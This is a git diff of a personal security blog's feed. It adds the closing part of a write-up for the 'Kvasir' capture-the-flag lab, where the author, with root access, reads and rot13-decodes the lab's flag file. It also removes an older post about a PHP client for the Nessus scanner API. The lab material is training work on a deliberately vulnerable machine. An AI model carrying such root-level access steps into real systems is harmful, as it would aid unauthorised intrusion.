+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@adm:~# python
+</span><span class='line'>Python 2.7.3 <span class="o">(</span>default, Mar 13 2014, 11:03:55<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>GCC 4.7.2<span class="o">]</span> on linux2
+</span><span class='line'>Type <span class="s2">&quot;help&quot;</span>, <span class="s2">&quot;copyright&quot;</span>, <span class="s2">&quot;credits&quot;</span> or <span class="s2">&quot;license&quot;</span> <span class="k">for </span>more information.
+</span><span class='line'>&gt;&gt;&gt; with open<span class="o">(</span><span class="s1">&#39;/root/flag&#39;</span><span class="o">)</span> as f:
+</span><span class='line'>...     <span class="nv">flag</span> <span class="o">=</span> f.read<span class="o">()</span>
+</span><span class='line'>...
+</span><span class='line'>&gt;&gt;&gt; print flag.decode<span class="o">(</span><span class="s1">&#39;rot13&#39;</span><span class="o">)</span>
+</span><span class='line'>    _  __                             _
+</span><span class='line'>   <span class="p">|</span> <span class="p">|</span>/ /   __ __   __ _     ___     <span class="o">(</span>_<span class="o">)</span>      _ _
+</span><span class='line'>   <span class="p">|</span> <span class="s1">&#39; &lt;    \ V /  / _` |   (_-&lt;     | |     | &#39;</span>_<span class="p">|</span>
+</span><span class='line'>   <span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  _<span class="se">\_</span>/_  <span class="se">\_</span>_,_<span class="p">|</span>   /__/_   _<span class="p">|</span>_<span class="p">|</span>_   _<span class="p">|</span>_<span class="p">|</span>_
+</span><span class='line'>  _<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>
+</span><span class='line'>  <span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span><span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span>
+</span><span class='line'>
+</span><span class='line'>Congratulations on beating Kvasir - I hope you enjoyed
+</span><span class='line'>the ride.  Take his blood, mix with honey and drink
+</span><span class='line'>the Mead of Poetry...
+</span><span class='line'>
+</span><span class='line'>Big shout out to my beta testers: @barrebas and @TheColonial.
+</span><span class='line'>Special thanks to Bas <span class="k">for </span>his patience during this endeavour.
+</span><span class='line'>
+</span><span class='line'>Feel free to ping me with thoughts/comments on
+</span><span class='line'>http://wi-fu.co.uk, <span class="c">#VulnHub IRC or Twitter.</span>
+</span><span class='line'>
+</span><span class='line'>  rasta_mouse<span class="o">(</span>@_RastaMouse<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>&gt;&gt;&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>conclusion</h2>
+
+<p>Wow. I actually can&rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!</p>
+
+<p>Many many thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for putting together this polished piece of work and <a href="https://twitter.com/VulHub">@VulnHub</a> for the hosting!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[knock-knock who’s there?]]></title>
@@ -11445,127 +13867,12 @@ Once this plugin is installed, some minor configuration is required to allow the
 <p>Save this code to something like <code>jabbersend.py</code> and execute it like this:
 <code>python jabbersend.py all@broadcast.jabber.server message_file.txt</code></p>
 
-<p>If all went OK, you should have received a message from <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x6a;&#x61;&#98;&#x62;&#101;&#x72;&#95;&#98;&#111;&#116;&#64;&#106;&#x61;&#98;&#98;&#x65;&#114;&#46;&#x73;&#101;&#x72;&#118;&#101;&#x72;">&#106;&#x61;&#x62;&#98;&#x65;&#114;&#95;&#98;&#x6f;&#116;&#x40;&#106;&#x61;&#x62;&#98;&#x65;&#114;&#46;&#115;&#x65;&#x72;&#118;&#101;&#x72;</a> :P</p>
+<p>If all went OK, you should have received a message from <a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#x6a;&#x61;&#x62;&#98;&#x65;&#x72;&#x5f;&#x62;&#x6f;&#116;&#64;&#106;&#x61;&#x62;&#x62;&#101;&#x72;&#46;&#115;&#x65;&#x72;&#118;&#x65;&#x72;">&#106;&#x61;&#x62;&#98;&#101;&#114;&#95;&#x62;&#x6f;&#x74;&#x40;&#106;&#x61;&#98;&#98;&#101;&#114;&#46;&#x73;&#x65;&#114;&#118;&#101;&#x72;</a> :P</p>
 
 <p>Our internal implementation of this has been used in multiple areas. From broadcasting OSSEC alerts to broadcasting important events from cronjobs.
 The OSSEC broadcasting I&rsquo;ll blog a little later, but you can obviously see the value that something like this brings. No more missing emails, if I receive a message from the bot, its important :)</p>
 
 <p>I have a slightly more matured version of this in a python module that I&rsquo;ll share later. If you are interested in this, poke me on twitter @leonjza</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Hello World! Oh and here's some code!]]></title>
-    <link href="http://leonjza.github.io/blog/2013/05/24/hello-world-oh-and-heres-some-code/"/>
-    <updated>2013-05-24T21:11:00+02:00</updated>
-    <id>http://leonjza.github.io/blog/2013/05/24/hello-world-oh-and-heres-some-code</id>
-    <content type="html"><![CDATA[<h3>Introduction</h3>
-
-<p>Finally! A blog engine I like! :) No exceptionally bloated backend database with plugins that just get hacked. Yup, slim and sleek. <em>And</em>, I get to make posts using Vi :D
-Want in on this love? Have a look at <a href="http://octopress.org">Octopress</a> . Yes, it was a real ball ache to get setup thanks to the ruby dependencies, but now that were rollin&#8217; this should be good :D</p>
-
-<!--more-->
-
-
-<h3>Frustrations breed Ideas</h3>
-
-<p>In my day job, I am exposed to a lot of work that will relate around the <a href="http://www.tenable.com/products/nessus">Nessus Vulnerability Scanner</a>.
-Originally, interfacing with this scanner used be via a old and clunky <em>flash</em> interface. It was bad. They have since moved over to a HTML5, ajaxy interface that is light years better. However, for my needs, the default Nessus Interface just does not cut it.</p>
-
-<h3>Open source? Where do I start?</h3>
-
-<p>Based on this old crappy interface, and the need to be able to automate things, I pulled closer the XMLRPC API reference <a href="http://static.tenable.com/documentation/nessus_5.0_XMLRPC_protocol_guide.pdf">documentation</a>. Reading this revealed the API is actually very straight forward. Login &ndash;> get a token &ndash;> make POST with this token and receive XML. Great.</p>
-
-<p>I started hacking away at some PHP to test this out. Back then I was really <em>very</em> new to this &lsquo;&#8217;development&rsquo;&lsquo; thing, so it was really tough to get my head around the concepts of working with the API. Nonetheless, we had something to work with, and this was implemented internally for numerous functions.</p>
-
-<p>Since then, <code>nessus.php</code> was born. The first iteration of this code was, well, worse than it is now, but its now very easy to use ( I believe ).</p>
-
-<h3>Instantiate a NessusInterface instance</h3>
-
-<p>To use this API, we first need to include it in our script, and then init the Class. Effectively, this will log into the scanner using the provided arguments and store the token in the object. Should it fail, it will raise an error.</p>
-
-<figure class='code'><figcaption><span>Sample PHP NessusInterface Usage</span><a href='https://github.com/th3l33k/php-nessus-api'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'><span class="k">require</span> <span class="s2">&quot;nessus.php&quot;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">try</span> <span class="p">{</span>
-</span><span class='line'>    <span class="nv">$api</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NessusInterface</span><span class="p">(</span>
-</span><span class='line'>        <span class="nv">$__url</span><span class="p">,</span>
-</span><span class='line'>        <span class="nv">$__port</span><span class="p">,</span>
-</span><span class='line'>        <span class="nv">$__username</span><span class="p">,</span>
-</span><span class='line'>        <span class="nv">$__password</span>
-</span><span class='line'>    <span class="p">);</span>
-</span><span class='line'><span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>    <span class="nx">preprint</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Do some API calls</h4>
-
-<p>Once you have the <code>$api</code> variable setup with a instance of <strong>NessusInterface</strong>, you can use any of the available calls. Most of the API calls will return some form of array:</p>
-
-<figure class='code'><figcaption><span>Sample API calls using NessusInterface</span><a href='https://github.com/th3l33k/php-nessus-api'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'><span class="k">try</span> <span class="p">{</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="nv">$api</span><span class="o">-&gt;</span><span class="na">feed</span><span class="p">();</span>
-</span><span class='line'>    <span class="c1"># // Will return an array like:</span>
-</span><span class='line'>    <span class="c1">#  Array</span>
-</span><span class='line'>    <span class="c1">#  (</span>
-</span><span class='line'>    <span class="c1">#    [feed] =&gt; ProFeed</span>
-</span><span class='line'>    <span class="c1">#    [server_version] =&gt; 5.2.1</span>
-</span><span class='line'>    <span class="c1">#    [web_server_version] =&gt; 4.0.37 (Build H20130515A)</span>
-</span><span class='line'>    <span class="c1">#    [expiration] =&gt; 1406174400</span>
-</span><span class='line'>    <span class="c1">#    [msp] =&gt; FALSE</span>
-</span><span class='line'>    <span class="c1">#    [loaded_plugin_set] =&gt; 201305240915</span>
-</span><span class='line'>    <span class="c1">#    [expiration_time] =&gt; 425</span>
-</span><span class='line'>    <span class="c1"># )</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="nx">preprint</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Reading the sources will reveal the structures of the returned arrays.
-Get the code <a href="https://github.com/th3l33k/php-nessus-api">here</a></p>
-
-<h3>Its the small things</h3>
-
-<p>This is by no means and elaborate &ldquo;solution&rdquo; really. It&rsquo;s purely another building block for something bigger. A believe there are quite a few fundamentals that the Nessus Scanner does not cover, but perhaps that is beyond the scope of what its designed to do :)</p>
 ]]></content>
   </entry>
   
